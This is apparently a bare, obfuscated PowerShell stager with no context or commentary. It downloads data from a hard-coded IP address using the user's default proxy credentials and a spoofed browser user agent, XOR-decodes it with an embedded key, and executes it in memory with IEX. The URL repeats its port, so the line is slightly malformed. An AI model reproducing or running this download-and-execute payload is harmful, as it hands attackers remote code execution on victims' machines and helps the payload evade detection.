
$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc.PRoxy.CrEDEnTIaLS = [SySTeM.NeT.CRedENTialCAcHE]::DEfauLtNETWOrKCReDENTials;$K='A}>7L^$89k`WVefHKDOGm4?1p:BX;P0,';$I=0;[cHar[]]$B=([cHaR[]]($wc.DOWNLOAdSTrInG("http://41.230.232.65:5552:5552/index.asp")))|%{$_-BXOr$k[$I++%$k.LEngTH]};IEX ($b-JOiN'')

